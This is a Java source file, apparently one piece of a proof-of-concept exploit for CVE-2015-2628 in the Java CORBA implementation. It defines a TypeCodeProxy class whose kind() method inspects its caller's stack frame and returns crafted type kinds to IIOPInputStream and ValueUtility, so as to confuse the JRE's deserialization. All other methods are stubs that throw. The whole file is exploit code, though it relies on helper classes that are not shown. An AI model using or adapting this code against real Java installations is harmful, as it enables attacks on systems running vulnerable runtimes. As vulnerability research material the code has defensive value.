package poc.cve_2015_2628;

import org.omg.CORBA.Any;
import org.omg.CORBA.TCKind;
import org.omg.CORBA.TypeCode;
import org.omg.CORBA.TypeCodePackage.BadKind;
import org.omg.CORBA.TypeCodePackage.Bounds;

public class TypeCodeProxy extends TypeCode {

	private static final long serialVersionUID = 8349855317462773413L;

	
	

	@Override
	public TCKind kind() {
		final StackTraceElement callerFrame = Utils.getCallerFrame( );
		
		final String callerClass  = callerFrame.getClassName( );
		final String callerMethod = callerFrame.getMethodName( );
		
		if( callerClass.equals( "com.sun.corba.se.impl.io.IIOPInputStream" ) ) {
			if( callerMethod.equals( "inputClassFields" ) ) {
				return OOP.TYPE.getTCKind( );
			}
		}
		else if( callerClass.equals( "com.sun.corba.se.impl.io.ValueUtility" ) ) {
			if( callerMethod.equals( "getSignature" ) ) {
				return TCKind.tk_objref;
			}
		}
		
		throw new AssertionError( "Unreconized caller frame: " + callerFrame );
	}
	
	// Unimplemented methods of TypeCode, throws exception on invocations.
	
	private void unimplemented() {
		throw new AssertionError("Unimplemented method invoked.");
	}

	@Override
	public boolean equal(org.omg.CORBA.TypeCode tc) {
		this.unimplemented();
		return false;
	}

	@Override
	public boolean equivalent(org.omg.CORBA.TypeCode tc) {
		this.unimplemented();
		return false;
	}

	@Override
	public org.omg.CORBA.TypeCode get_compact_typecode() {
		this.unimplemented();
		return null;
	}

	@Override
	public String id() throws BadKind {
		this.unimplemented();
		return null;
	}

	@Override
	public String name() throws BadKind {
		this.unimplemented();
		return null;
	}

	@Override
	public int member_count() throws BadKind {
		this.unimplemented();
		return 0;
	}

	@Override
	public String member_name(int index) throws BadKind, Bounds {
		this.unimplemented();
		return null;
	}

	@Override
	public org.omg.CORBA.TypeCode member_type(int index) throws BadKind, Bounds {
		this.unimplemented();
		return null;
	}

	@Override
	public Any member_label(int index) throws BadKind, Bounds {
		this.unimplemented();
		return null;
	}

	@Override
	public org.omg.CORBA.TypeCode discriminator_type() throws BadKind {
		this.unimplemented();
		return null;
	}

	@Override
	public int default_index() throws BadKind {
		this.unimplemented();
		return 0;
	}

	@Override
	public int length() throws BadKind {
		this.unimplemented();
		return 0;
	}

	@Override
	public org.omg.CORBA.TypeCode content_type() throws BadKind {
		this.unimplemented();
		return null;
	}

	@Override
	public short fixed_digits() throws BadKind {
		this.unimplemented();
		return 0;
	}

	@Override
	public short fixed_scale() throws BadKind {
		this.unimplemented();
		return 0;
	}

	@Override
	public short member_visibility(int index) throws BadKind, Bounds {
		this.unimplemented();
		return 0;
	}

	@Override
	public short type_modifier() throws BadKind {
		this.unimplemented();
		return 0;
	}

	@Override
	public org.omg.CORBA.TypeCode concrete_base_type() throws BadKind {
		this.unimplemented();
		return null;
	}

}
